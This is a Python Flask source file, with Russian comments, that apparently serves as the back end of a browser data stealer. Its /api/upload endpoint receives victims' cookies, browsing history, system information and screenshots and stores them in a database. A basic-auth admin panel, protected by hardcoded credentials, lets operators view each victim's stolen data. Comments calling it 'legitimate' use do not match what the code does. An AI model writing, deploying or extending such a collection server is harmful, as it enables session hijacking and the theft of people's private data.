import os
import json
import base64
from datetime import datetime
from flask import Flask, request, render_template, abort, jsonify, send_file, Response
from flask_httpauth import HTTPBasicAuth
import psycopg2
import psycopg2.extras
from io import BytesIO

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "change-me-to-a-secret")
auth = HTTPBasicAuth()

# Админ-аккаунты (меняй на проде)
ADMINS = {"angel0chek": "angel0chek", "winter": "winter"}

UPLOAD_API_KEY = os.getenv("UPLOAD_API_KEY", None)
DATABASE_URL = os.getenv("DATABASE_URL", os.getenv("NEON_URL", None))

if not DATABASE_URL:
    raise RuntimeError("DATABASE_URL (или NEON_URL) must be set in env")

# --- Basic auth ---
@auth.verify_password
def verify(username, password):
    if username in ADMINS and ADMINS[username] == password:
        return username
    return None

# --- DB helpers ---
def get_conn():
    # psycopg2 handles the URL (with sslmode etc if present)
    return psycopg2.connect(DATABASE_URL, cursor_factory=psycopg2.extras.RealDictCursor)

def init_db():
    conn = get_conn()
    cur = conn.cursor()
    cur.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id SERIAL PRIMARY KEY,
            username TEXT,
            cookies JSONB,
            history JSONB,
            system_info JSONB,
            screenshot BYTEA,
            timestamp TIMESTAMP
        );
    ''')
    conn.commit()
    cur.close()
    conn.close()

init_db()

def user_from_row(row):
    if not row:
        return None
    return {
        "id": row["id"],
        "username": row["username"],
        # cookies/history/system_info are stored as JSONB -> psycopg2 returns python types
        "cookies": row["cookies"] or [],
        "history": row["history"] or [],
        "system_info": row["system_info"] or {},
        "has_screenshot": bool(row["screenshot"]),
        "timestamp": row["timestamp"].strftime("%Y-%m-%d %H:%M:%S") if row["timestamp"] else ""
    }

# --- Routes ---
@app.route('/')
@auth.login_required
def admin_panel():
    conn = get_conn()
    cur = conn.cursor()
    cur.execute("SELECT id, username, timestamp FROM users ORDER BY id DESC LIMIT 200")
    rows = cur.fetchall()
    cur.close()
    conn.close()
    users = [{"id": r["id"], "username": r["username"], "timestamp": (r["timestamp"].strftime("%Y-%m-%d %H:%M:%S") if r["timestamp"] else "")} for r in rows]
    return render_template('admin.html', users=users)

@app.route('/user/<int:user_id>')
@auth.login_required
def view_user(user_id):
    # Return page skeleton; big fields loaded via AJAX
    conn = get_conn()
    cur = conn.cursor()
    cur.execute("SELECT id, username, timestamp, (screenshot IS NOT NULL) as has_screenshot FROM users WHERE id=%s", (user_id,))
    row = cur.fetchone()
    cur.close()
    conn.close()
    if not row:
        abort(404)
    user_meta = {"id": row["id"], "username": row["username"], "timestamp": (row["timestamp"].strftime("%Y-%m-%d %H:%M:%S") if row["timestamp"] else ""), "has_screenshot": row["has_screenshot"]}
    return render_template('user_detail.html', user=user_meta)

@app.route('/api/data/<int:user_id>')
@auth.login_required
def api_user_data(user_id):
    # Return full JSON (cookies/history/system_info) — consumed by admin UI via AJAX
    conn = get_conn()
    cur = conn.cursor()
    cur.execute("SELECT cookies, history, system_info, timestamp FROM users WHERE id=%s", (user_id,))
    row = cur.fetchone()
    cur.close()
    conn.close()
    if not row:
        return jsonify({"error": "not found"}), 404
    return jsonify({
        "cookies": row["cookies"] or [],
        "history": row["history"] or [],
        "system_info": row["system_info"] or {},
        "timestamp": row["timestamp"].strftime("%Y-%m-%d %H:%M:%S") if row["timestamp"] else ""
    })

@app.route('/screenshot/<int:user_id>')
@auth.login_required
def screenshot(user_id):
    conn = get_conn()
    cur = conn.cursor()
    cur.execute("SELECT screenshot FROM users WHERE id=%s", (user_id,))
    row = cur.fetchone()
    cur.close()
    conn.close()
    if not row or not row["screenshot"]:
        abort(404)
    img_bytes = row["screenshot"]
    return Response(img_bytes, mimetype='image/png')

@app.route('/api/upload', methods=['POST'])
def api_upload():
    # This endpoint requires an API key in header X-API-KEY
    key = request.headers.get("X-API-KEY")
    if not UPLOAD_API_KEY or key != UPLOAD_API_KEY:
        return jsonify({"error": "unauthorized"}), 401

    data = request.get_json(silent=True)
    if not data:
        return jsonify({"error": "invalid json"}), 400

    username = data.get("username", "unknown")
    cookies = data.get("cookies", [])
    history = data.get("history", [])
    system_info = data.get("systemInfo", {})
    screenshot = data.get("screenshot")  # expected as data URI or base64 string

    screenshot_bytes = None
    if screenshot:
        # Accept either "data:image/png;base64,..." or pure base64
        if isinstance(screenshot, str) and screenshot.startswith("data:"):
            try:
                screenshot_bytes = base64.b64decode(screenshot.split(",", 1)[1])
            except Exception:
                screenshot_bytes = None
        else:
            try:
                screenshot_bytes = base64.b64decode(screenshot)
            except Exception:
                screenshot_bytes = None

    timestamp = datetime.utcnow()

    conn = get_conn()
    cur = conn.cursor()
    try:
        # Use psycopg2.extras.Json for JSONB parameters
        cur.execute(
            "INSERT INTO users (username, cookies, history, system_info, screenshot, timestamp) VALUES (%s, %s, %s, %s, %s, %s) RETURNING id",
            (username, psycopg2.extras.Json(cookies), psycopg2.extras.Json(history), psycopg2.extras.Json(system_info), psycopg2.Binary(screenshot_bytes) if screenshot_bytes else None, timestamp)
        )
        new_id = cur.fetchone()[0]
        conn.commit()
    except Exception as e:
        conn.rollback()
        cur.close()
        conn.close()
        return jsonify({"error": "db error", "detail": str(e)}), 500

    cur.close()
    conn.close()
    return jsonify({"status": "ok", "id": new_id})

# Small helper page for manual upload via browser (for legitimate backups)
@app.route('/upload', methods=['GET', 'POST'])
@auth.login_required
def upload_form():
    if request.method == 'POST':
        # Admin can paste JSONs or upload a file. This is manual — for legitimate use only.
        username = request.form.get("username", "unknown")
        cookies_text = request.form.get("cookies", "[]")
        history_text = request.form.get("history", "[]")
        system_text = request.form.get("system_info", "{}")
        screenshot_file = request.files.get("screenshot")
        try:
            cookies = json.loads(cookies_text)
        except Exception:
            cookies = []
        try:
            history = json.loads(history_text)
        except Exception:
            history = []
        try:
            system_info = json.loads(system_text)
        except Exception:
            system_info = {}
        screenshot_bytes = screenshot_file.read() if screenshot_file else None

        conn = get_conn()
        cur = conn.cursor()
        cur.execute(
            "INSERT INTO users (username, cookies, history, system_info, screenshot, timestamp) VALUES (%s, %s, %s, %s, %s, %s)",
            (username, psycopg2.extras.Json(cookies), psycopg2.extras.Json(history), psycopg2.extras.Json(system_info), psycopg2.Binary(screenshot_bytes) if screenshot_bytes else None, datetime.utcnow())
        )
        conn.commit()
        cur.close()
        conn.close()
        return render_template('upload_success.html'), 201

    return render_template('upload_form.html')

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run("0.0.0.0", port=port)
